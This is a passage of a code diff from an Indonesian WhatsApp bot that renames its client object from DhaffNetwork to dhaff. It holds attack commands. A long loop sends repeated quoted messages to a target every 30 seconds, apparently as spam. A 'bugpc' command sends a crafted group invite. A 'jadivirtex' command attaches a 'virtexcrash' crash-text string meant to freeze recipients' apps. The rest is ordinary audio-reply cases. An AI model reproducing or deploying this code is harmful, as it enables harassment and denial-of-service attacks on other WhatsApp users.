+                dhaff.sendMessage(Pe, {text:"."}, {quoted: b})
                 await sleep(30000)
-                DhaffNetwork.sendMessage(Pe, {text:"."}, {quoted: a})
+                dhaff.sendMessage(Pe, {text:"."}, {quoted: a})
                 await sleep(30000)
-                DhaffNetwork.sendMessage(Pe, {text:"."}, {quoted: b})
+                dhaff.sendMessage(Pe, {text:"."}, {quoted: b})
                 await sleep(30000)
-                DhaffNetwork.sendMessage(Pe, {text:"."}, {quoted: a})
+                dhaff.sendMessage(Pe, {text:"."}, {quoted: a})
                 await sleep(30000)
-                DhaffNetwork.sendMessage(Pe, {text:"."}, {quoted: b})
+                dhaff.sendMessage(Pe, {text:"."}, {quoted: b})
                 await sleep(30000)
-                DhaffNetwork.sendMessage(Pe, {text:"."}, {quoted: a})
+                dhaff.sendMessage(Pe, {text:"."}, {quoted: a})
                 await sleep(30000)
-                DhaffNetwork.sendMessage(Pe, {text:"."}, {quoted: b})
+                dhaff.sendMessage(Pe, {text:"."}, {quoted: b})
                 await sleep(30000)
-                DhaffNetwork.sendMessage(Pe, {text:"."}, {quoted: a})
+                dhaff.sendMessage(Pe, {text:"."}, {quoted: a})
                 await sleep(30000)
-                DhaffNetwork.sendMessage(Pe, {text:"."}, {quoted: b})
+                dhaff.sendMessage(Pe, {text:"."}, {quoted: b})
                 await sleep(30000)
-                DhaffNetwork.sendMessage(Pe, {text:"."}, {quoted: a})
+                dhaff.sendMessage(Pe, {text:"."}, {quoted: a})
                 await sleep(30000)
-                DhaffNetwork.sendMessage(Pe, {text:"."}, {quoted: b})
+                dhaff.sendMessage(Pe, {text:"."}, {quoted: b})
                 await sleep(30000)
-                DhaffNetwork.sendMessage(Pe, {text:"."}, {quoted: a})
+                dhaff.sendMessage(Pe, {text:"."}, {quoted: a})
                 await sleep(30000)
-                DhaffNetwork.sendMessage(Pe, {text:"."}, {quoted: b})
+                dhaff.sendMessage(Pe, {text:"."}, {quoted: b})
                 await sleep(30000)
-                DhaffNetwork.sendMessage(Pe, {text:"."}, {quoted: a})
+                dhaff.sendMessage(Pe, {text:"."}, {quoted: a})
                 await sleep(30000)
-                DhaffNetwork.sendMessage(Pe, {text:"."}, {quoted: b})
+                dhaff.sendMessage(Pe, {text:"."}, {quoted: b})
                 await sleep(30000)
-                DhaffNetwork.sendMessage(Pe, {text:"."}, {quoted: a})
+                dhaff.sendMessage(Pe, {text:"."}, {quoted: a})
                 await sleep(30000)
-                DhaffNetwork.sendMessage(Pe, {text:"."}, {quoted: b})
+                dhaff.sendMessage(Pe, {text:"."}, {quoted: b})
                 await sleep(30000)
-                DhaffNetwork.sendMessage(Pe, {text:"."}, {quoted: a})
+                dhaff.sendMessage(Pe, {text:"."}, {quoted: a})
                 await sleep(30000)
-                DhaffNetwork.sendMessage(Pe, {text:"."}, {quoted: b})
+                dhaff.sendMessage(Pe, {text:"."}, {quoted: b})
                 await sleep(30000)
-                DhaffNetwork.sendMessage(Pe, {text:"."}, {quoted: a})
+                dhaff.sendMessage(Pe, {text:"."}, {quoted: a})
                 await sleep(30000)
-                DhaffNetwork.sendMessage(Pe, {text:"."}, {quoted: b})
+                dhaff.sendMessage(Pe, {text:"."}, {quoted: b})
                 await sleep(30000)
-                DhaffNetwork.sendMessage(Pe, {text:"."}, {quoted: a})
+                dhaff.sendMessage(Pe, {text:"."}, {quoted: a})
                 await sleep(30000)
-                DhaffNetwork.sendMessage(Pe, {text:"."}, {quoted: b})
+                dhaff.sendMessage(Pe, {text:"."}, {quoted: b})
                 await sleep(30000)
-                DhaffNetwork.sendMessage(Pe, {text:"."}, {quoted: a})
+                dhaff.sendMessage(Pe, {text:"."}, {quoted: a})
                 await sleep(30000)
-                DhaffNetwork.sendMessage(Pe, {text:"."}, {quoted: b})
+                dhaff.sendMessage(Pe, {text:"."}, {quoted: b})
                 await sleep(30000)
-                DhaffNetwork.sendMessage(Pe, {text:"."}, {quoted: a})
+                dhaff.sendMessage(Pe, {text:"."}, {quoted: a})
                 await sleep(30000)
-                DhaffNetwork.sendMessage(Pe, {text:"."}, {quoted: b})
+                dhaff.sendMessage(Pe, {text:"."}, {quoted: b})
                 await sleep(30000)
-                DhaffNetwork.sendMessage(Pe, {text:"."}, {quoted: a})
+                dhaff.sendMessage(Pe, {text:"."}, {quoted: a})
                 await sleep(30000)
-                DhaffNetwork.sendMessage(Pe, {text:"."}, {quoted: b})
+                dhaff.sendMessage(Pe, {text:"."}, {quoted: b})
                 await sleep(30000)
-                DhaffNetwork.sendMessage(Pe, {text:"."}, {quoted: a})
+                dhaff.sendMessage(Pe, {text:"."}, {quoted: a})
                 await sleep(30000)
-                DhaffNetwork.sendMessage(Pe, {text:"."}, {quoted: b})
+                dhaff.sendMessage(Pe, {text:"."}, {quoted: b})
                 await sleep(30000)
-                DhaffNetwork.sendMessage(Pe, {text:"."}, {quoted: a})
+                dhaff.sendMessage(Pe, {text:"."}, {quoted: a})
                 await sleep(30000)
-                DhaffNetwork.sendMessage(Pe, {text:"."}, {quoted: b})
+                dhaff.sendMessage(Pe, {text:"."}, {quoted: b})
                 await sleep(30000)
-                DhaffNetwork.sendMessage(Pe, {text:"."}, {quoted: a})
+                dhaff.sendMessage(Pe, {text:"."}, {quoted: a})
                 await sleep(30000)
-                DhaffNetwork.sendMessage(Pe, {text:"."}, {quoted: b})
+                dhaff.sendMessage(Pe, {text:"."}, {quoted: b})
                 await sleep(30000)
-                DhaffNetwork.sendMessage(Pe, {text:"."}, {quoted: a})
+                dhaff.sendMessage(Pe, {text:"."}, {quoted: a})
                 await sleep(30000)
-                DhaffNetwork.sendMessage(Pe, {text:"."}, {quoted: b})
+                dhaff.sendMessage(Pe, {text:"."}, {quoted: b})
                 await sleep(30000)
-                DhaffNetwork.sendMessage(Pe, {text:"."}, {quoted: a})
+                dhaff.sendMessage(Pe, {text:"."}, {quoted: a})
                 await sleep(30000)
-                DhaffNetwork.sendMessage(Pe, {text:"."}, {quoted: b})
+                dhaff.sendMessage(Pe, {text:"."}, {quoted: b})
                 await sleep(30000)
-                DhaffNetwork.sendMessage(Pe, {text:"."}, {quoted: a})
+                dhaff.sendMessage(Pe, {text:"."}, {quoted: a})
                 await sleep(30000)
-                DhaffNetwork.sendMessage(Pe, {text:"."}, {quoted: b})
+                dhaff.sendMessage(Pe, {text:"."}, {quoted: b})
                 await sleep(30000)
-                DhaffNetwork.sendMessage(Pe, {text:"."}, {quoted: a})
+                dhaff.sendMessage(Pe, {text:"."}, {quoted: a})
                 await sleep(30000)
-                DhaffNetwork.sendMessage(Pe, {text:"."}, {quoted: b})
+                dhaff.sendMessage(Pe, {text:"."}, {quoted: b})
                 await sleep(30000)
-                DhaffNetwork.sendMessage(Pe, {text:"."}, {quoted: a})
+                dhaff.sendMessage(Pe, {text:"."}, {quoted: a})
                 await sleep(30000)
-                DhaffNetwork.sendMessage(Pe, {text:"."}, {quoted: b})
+                dhaff.sendMessage(Pe, {text:"."}, {quoted: b})
                 await sleep(30000)
-                DhaffNetwork.sendMessage(Pe, {text:"."}, {quoted: a})
+                dhaff.sendMessage(Pe, {text:"."}, {quoted: a})
                 await sleep(30000)
-                DhaffNetwork.sendMessage(Pe, {text:"."}, {quoted: b})
+                dhaff.sendMessage(Pe, {text:"."}, {quoted: b})
                 await sleep(30000)
-                DhaffNetwork.sendMessage(Pe, {text:"."}, {quoted: a})
+                dhaff.sendMessage(Pe, {text:"."}, {quoted: a})
                 await sleep(30000)
-                DhaffNetwork.sendMessage(Pe, {text:"."}, {quoted: b})
+                dhaff.sendMessage(Pe, {text:"."}, {quoted: b})
                 await sleep(30000)
-                DhaffNetwork.sendMessage(Pe, {text:"."}, {quoted: a})
+                dhaff.sendMessage(Pe, {text:"."}, {quoted: a})
                 await sleep(30000)
-                DhaffNetwork.sendMessage(Pe, {text:"."}, {quoted: b})
+                dhaff.sendMessage(Pe, {text:"."}, {quoted: b})
                 await sleep(30000)
-                DhaffNetwork.sendMessage(Pe, {text:"."}, {quoted: a})
+                dhaff.sendMessage(Pe, {text:"."}, {quoted: a})
                 await sleep(30000)
-                DhaffNetwork.sendMessage(Pe, {text:"."}, {quoted: b})
+                dhaff.sendMessage(Pe, {text:"."}, {quoted: b})
                 await sleep(30000)
-                DhaffNetwork.sendMessage(Pe, {text:"."}, {quoted: a})
+                dhaff.sendMessage(Pe, {text:"."}, {quoted: a})
                 await sleep(30000)
-                DhaffNetwork.sendMessage(Pe, {text:"."}, {quoted: b})
+                dhaff.sendMessage(Pe, {text:"."}, {quoted: b})
                 await sleep(30000)
-                DhaffNetwork.sendMessage(Pe, {text:"."}, {quoted: a})
+                dhaff.sendMessage(Pe, {text:"."}, {quoted: a})
                 await sleep(30000)
-                DhaffNetwork.sendMessage(Pe, {text:"."}, {quoted: b})
+                dhaff.sendMessage(Pe, {text:"."}, {quoted: b})
                 await sleep(30000)
-                DhaffNetwork.sendMessage(Pe, {text:"."}, {quoted: a})
+                dhaff.sendMessage(Pe, {text:"."}, {quoted: a})
                 await sleep(30000)
-                DhaffNetwork.sendMessage(Pe, {text:"."}, {quoted: b})
+                dhaff.sendMessage(Pe, {text:"."}, {quoted: b})
                 await sleep(30000)
-                DhaffNetwork.sendMessage(Pe, {text:"."}, {quoted: a})
+                dhaff.sendMessage(Pe, {text:"."}, {quoted: a})
                 await sleep(30000)
-                DhaffNetwork.sendMessage(Pe, {text:"."}, {quoted: b})
+                dhaff.sendMessage(Pe, {text:"."}, {quoted: b})
                 await sleep(30000)
-                DhaffNetwork.sendMessage(Pe, {text:"."}, {quoted: a})
+                dhaff.sendMessage(Pe, {text:"."}, {quoted: a})
                 await sleep(30000)
-                DhaffNetwork.sendMessage(Pe, {text:"."}, {quoted: b})
+                dhaff.sendMessage(Pe, {text:"."}, {quoted: b})
                 await sleep(30000)
-                DhaffNetwork.sendMessage(Pe, {text:"."}, {quoted: a})
+                dhaff.sendMessage(Pe, {text:"."}, {quoted: a})
                 await sleep(30000)
-                DhaffNetwork.sendMessage(Pe, {text:"."}, {quoted: b})
+                dhaff.sendMessage(Pe, {text:"."}, {quoted: b})
                 await sleep(30000)
-                DhaffNetwork.sendMessage(Pe, {text:"."}, {quoted: a})
+                dhaff.sendMessage(Pe, {text:"."}, {quoted: a})
                 await sleep(30000)
-                DhaffNetwork.sendMessage(Pe, {text:"."}, {quoted: b})
+                dhaff.sendMessage(Pe, {text:"."}, {quoted: b})
                 await sleep(30000)
-                DhaffNetwork.sendMessage(Pe, {text:"."}, {quoted: a})
+                dhaff.sendMessage(Pe, {text:"."}, {quoted: a})
                 await sleep(30000)
-                DhaffNetwork.sendMessage(Pe, {text:"."}, {quoted: b})
+                dhaff.sendMessage(Pe, {text:"."}, {quoted: b})
                 await sleep(30000)
-                DhaffNetwork.sendMessage(Pe, {text:"."}, {quoted: a})
+                dhaff.sendMessage(Pe, {text:"."}, {quoted: a})
                 await sleep(30000)
-                DhaffNetwork.sendMessage(Pe, {text:"."}, {quoted: b})
+                dhaff.sendMessage(Pe, {text:"."}, {quoted: b})
                 await sleep(30000)
-                DhaffNetwork.sendMessage(Pe, {text:"."}, {quoted: a})
+                dhaff.sendMessage(Pe, {text:"."}, {quoted: a})
                 await sleep(30000)
-                DhaffNetwork.sendMessage(Pe, {text:"."}, {quoted: b})
+                dhaff.sendMessage(Pe, {text:"."}, {quoted: b})
                 await sleep(30000)
-                DhaffNetwork.sendMessage(Pe, {text:"."}, {quoted: a})
+                dhaff.sendMessage(Pe, {text:"."}, {quoted: a})
                 await sleep(30000)
-                DhaffNetwork.sendMessage(Pe, {text:"."}, {quoted: b})
+                dhaff.sendMessage(Pe, {text:"."}, {quoted: b})
                 await sleep(30000)
-                DhaffNetwork.sendMessage(Pe, {text:"."}, {quoted: a})
+                dhaff.sendMessage(Pe, {text:"."}, {quoted: a})
                 await sleep(30000)
-                DhaffNetwork.sendMessage(Pe, {text:"."}, {quoted: b})
+                dhaff.sendMessage(Pe, {text:"."}, {quoted: b})
                 await sleep(30000)
-                DhaffNetwork.sendMessage(Pe, {text:"."}, {quoted: a})
+                dhaff.sendMessage(Pe, {text:"."}, {quoted: a})
                 await sleep(30000)
-                DhaffNetwork.sendMessage(Pe, {text:"."}, {quoted: b})
+                dhaff.sendMessage(Pe, {text:"."}, {quoted: b})
                 await sleep(30000)
-                DhaffNetwork.sendMessage(Pe, {text:"."}, {quoted: a})
+                dhaff.sendMessage(Pe, {text:"."}, {quoted: a})
                 await sleep(30000)
-                DhaffNetwork.sendMessage(Pe, {text:"."}, {quoted: b})
+                dhaff.sendMessage(Pe, {text:"."}, {quoted: b})
                 await sleep(30000)
-                DhaffNetwork.sendMessage(Pe, {text:"."}, {quoted: a})
+                dhaff.sendMessage(Pe, {text:"."}, {quoted: a})
                 await sleep(30000)
-                DhaffNetwork.sendMessage(Pe, {text:"."}, {quoted: b})
+                dhaff.sendMessage(Pe, {text:"."}, {quoted: b})
                 await sleep(30000)
-                DhaffNetwork.sendMessage(Pe, {text:"."}, {quoted: a})
+                dhaff.sendMessage(Pe, {text:"."}, {quoted: a})
                 await sleep(30000)
-                DhaffNetwork.sendMessage(Pe, {text:"."}, {quoted: b})
+                dhaff.sendMessage(Pe, {text:"."}, {quoted: b})
                 await sleep(30000)
-                DhaffNetwork.sendMessage(Pe, {text:"."}, {quoted: a})
+                dhaff.sendMessage(Pe, {text:"."}, {quoted: a})
                 await sleep(30000)
-                DhaffNetwork.sendMessage(Pe, {text:"."}, {quoted: b})
+                dhaff.sendMessage(Pe, {text:"."}, {quoted: b})
                 await sleep(30000)
-                DhaffNetwork.sendMessage(Pe, {text:"."}, {quoted: a})
+                dhaff.sendMessage(Pe, {text:"."}, {quoted: a})
                 await sleep(30000)
-                DhaffNetwork.sendMessage(Pe, {text:"."}, {quoted: b})
+                dhaff.sendMessage(Pe, {text:"."}, {quoted: b})
                 await sleep(30000)
-                DhaffNetwork.sendMessage(Pe, {text:"."}, {quoted: a})
+                dhaff.sendMessage(Pe, {text:"."}, {quoted: a})
                 await sleep(30000)
-                DhaffNetwork.sendMessage(Pe, {text:"."}, {quoted: b})
+                dhaff.sendMessage(Pe, {text:"."}, {quoted: b})
                 await sleep(30000)
 break
 case 'bugpc': {
 if (!isCreator) return
-var messa = await prepareWAMessageMedia({ image: thumb }, { upload: DhaffNetwork.waUploadToServer })
+var messa = await prepareWAMessageMedia({ image: thumb }, { upload: dhaff.waUploadToServer })
 var groupInvite = generateWAMessageFromContent(m.chat, proto.Message.fromObject({
 "groupInviteMessage": {
 "groupJid": "85296556573-1328272333@g.us",
@@ -10616,34 +10788,24 @@ var groupInvite = generateWAMessageFromContent(m.chat, proto.Message.fromObject(
 "jpegThumbnail": messa.imageMessage,
 }
 }), { userJid: m.chat, quoted: m })
-DhaffNetwork.relayMessage(m.chat, groupInvite.message, { messageId: groupInvite.key.id })
+dhaff.relayMessage(m.chat, groupInvite.message, { messageId: groupInvite.key.id })
 }
 break
 case 'jadivirtex':
 if (!isCreator) return
 if (!text) throw `MANA TEXT NYA PANTEX`
-DhaffNetwork.sendMessage(m.chat, { text: `${text} ${virtexcrash}`, contextInfo:{"externalAdReply": {"title": ` ${virtexcrash}`,"body": `${virtexcrash}`, "previewType": "PHOTO","thumbnailUrl": ``,"thumbnail": ``,"sourceUrl": "https://wa.me/stickerpack/StickerHeist"}}}, { quoted: m})
+dhaff.sendMessage(m.chat, { text: `${text} ${virtexcrash}`, contextInfo:{"externalAdReply": {"title": ` ${virtexcrash}`,"body": `${virtexcrash}`, "previewType": "PHOTO","thumbnailUrl": ``,"thumbnail": ``,"sourceUrl": "https://wa.me/stickerpack/StickerHeist"}}}, { quoted: m})
 break
-
 //case tambahan
 
 case 'assalamualaikum': case 'asalamualaikum': case 'samlekom':
                                         await DhaffNetwork.sendMessage(m.chat, {audio:  fs.readFileSync('./galery/audio/salam.mp3'), mimetype: 'audio/mp4', ptt:true}, {quoted:m})
-kapulnax = `
-waalaikum salam wr wb`
-m.reply(kapulnax)           
 break
-case 'mastah':
+case 'mastah': case 'lord':
                                         await DhaffNetwork.sendMessage(m.chat, {audio:  fs.readFileSync('./galery/audio/mastah.mp3'), mimetype: 'audio/mp4', ptt:true}, {quoted:m})
-freem = `
-Lari Ada Mastah🏃`
-m.reply(freem)           
 break
 case 'anjing': case 'asu': case 'bokep': case 'ngentot': case 'kontol':
                                await DhaffNetwork.sendMessage(m.chat, {audio:  fs.readFileSync('./galery/audio/tobat.mp3'), mimetype: 'audio/mp4', ptt:true}, {quoted:m})
-breem = `
-YA AMPUN KASAR BANGET IH JADI ORANG`
-m.reply(breem)           
 break
 case 'gameninjabox':
 	   if (isBan) return reply(mess.ban)
